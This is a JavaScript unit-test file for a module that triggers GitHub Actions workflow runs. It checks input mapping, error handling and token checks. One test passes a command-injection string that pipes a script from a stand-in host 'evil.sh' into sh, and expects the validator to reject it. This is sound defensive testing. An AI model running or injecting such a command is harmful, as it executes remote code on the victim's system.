/**
 * Unit tests for the GitHub Actions dispatch used by the hourly pulse.
 * Run with: npm test  (node:test, no network — fetch is injected).
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import {
  buildDispatchInputs,
  dispatchInstitutionalResearch,
  runPulseDispatch,
} from "../github-dispatch.js";

const DISPATCH_URL =
  "https://api.github.com/repos/abhishekdutta18/blogspro/actions/workflows/institutional-research.yml/dispatches";

/** Records every call and answers with the given status/body. */
function createFetchMock({ status = 204, body = "", headers = {} } = {}) {
  const calls = [];
  const fetchImpl = async (url, init) => {
    calls.push({ url, init, body: init?.body ? JSON.parse(init.body) : null });
    return new Response(status === 204 ? null : body, { status, headers });
  };
  return { fetchImpl, calls };
}

test("hourly pulse sends exactly the inputs the workflow declares (freq, type)", async () => {
  const { fetchImpl, calls } = createFetchMock({
    headers: { "x-github-request-id": "ABCD:1234" },
  });

  const result = await dispatchInstitutionalResearch({
    token: "test-token",
    frequency: "hourly",
    type: "pulse",
    fetchImpl,
  });

  assert.equal(calls.length, 1);
  assert.equal(calls[0].url, DISPATCH_URL);
  assert.equal(calls[0].init.method, "POST");
  assert.equal(calls[0].init.headers.Authorization, "Bearer test-token");
  assert.deepEqual(calls[0].body, {
    ref: "main",
    inputs: { freq: "hourly", type: "pulse" },
  });
  assert.equal(result.status, 204);
  assert.equal(result.githubRequestId, "ABCD:1234");
});

test("never sends the legacy 'frequency' input that GitHub rejects", async () => {
  const { fetchImpl, calls } = createFetchMock();

  await dispatchInstitutionalResearch({
    token: "t",
    frequency: "daily",
    type: "pulse",
    fetchImpl,
  });

  assert.equal("frequency" in calls[0].body.inputs, false);
});

test("a 422 from GitHub throws with the status and the response body", async () => {
  const githubBody = JSON.stringify({
    message: "Unexpected inputs provided: [\"frequency\"]",
  });
  const { fetchImpl } = createFetchMock({ status: 422, body: githubBody });

  await assert.rejects(
    dispatchInstitutionalResearch({
      token: "t",
      frequency: "hourly",
      type: "pulse",
      fetchImpl,
    }),
    (err) => {
      assert.equal(err.status, 422);
      assert.match(err.message, /422/);
      assert.match(err.message, /Unexpected inputs provided/);
      return true;
    },
  );
});

test("a 5xx from GitHub also throws so Inngest records a failure and retries", async () => {
  const { fetchImpl } = createFetchMock({ status: 502, body: "Bad Gateway" });

  await assert.rejects(
    dispatchInstitutionalResearch({
      token: "t",
      frequency: "hourly",
      type: "pulse",
      fetchImpl,
    }),
    /502.*Bad Gateway/,
  );
});

test("buildDispatchInputs defaults type by frequency when none is given", () => {
  assert.deepEqual(buildDispatchInputs({ frequency: "hourly" }), { freq: "hourly", type: "pulse" });
  assert.deepEqual(buildDispatchInputs({ frequency: "daily" }), { freq: "daily", type: "pulse" });
  assert.deepEqual(buildDispatchInputs({ frequency: "weekly" }), { freq: "weekly", type: "article" });
  assert.deepEqual(buildDispatchInputs({ frequency: "monthly" }), { freq: "monthly", type: "article" });
});

test("buildDispatchInputs rejects a frequency the workflow's choice list does not offer", () => {
  assert.throws(() => buildDispatchInputs({ frequency: "minutely", type: "pulse" }), /frequency/i);
});

test("buildDispatchInputs rejects an unknown type instead of forwarding it to the shell step", () => {
  assert.throws(
    () => buildDispatchInputs({ frequency: "hourly", type: 'pulse"; curl evil.sh | sh; "' }),
    /type/i,
  );
});

test("runPulseDispatch throws before any network call when GH_PAT is missing", async () => {
  const { fetchImpl, calls } = createFetchMock();

  await assert.rejects(
    runPulseDispatch({ eventData: { frequency: "hourly" }, env: {}, fetchImpl }),
    /GH_PAT/,
  );
  assert.equal(calls.length, 0);
});

test("runPulseDispatch maps the cron event payload to workflow inputs", async () => {
  const { fetchImpl, calls } = createFetchMock();

  const result = await runPulseDispatch({
    eventData: { jobId: "cron-1", type: "pulse", frequency: "hourly" },
    env: { GH_PAT: "pat" },
    fetchImpl,
  });

  assert.deepEqual(calls[0].body.inputs, { freq: "hourly", type: "pulse" });
  assert.equal(result.success, true);
  assert.equal(result.status, "DISPATCHED_TO_GHA");
  assert.equal(result.frequency, "hourly");
  assert.equal(result.type, "pulse");
});
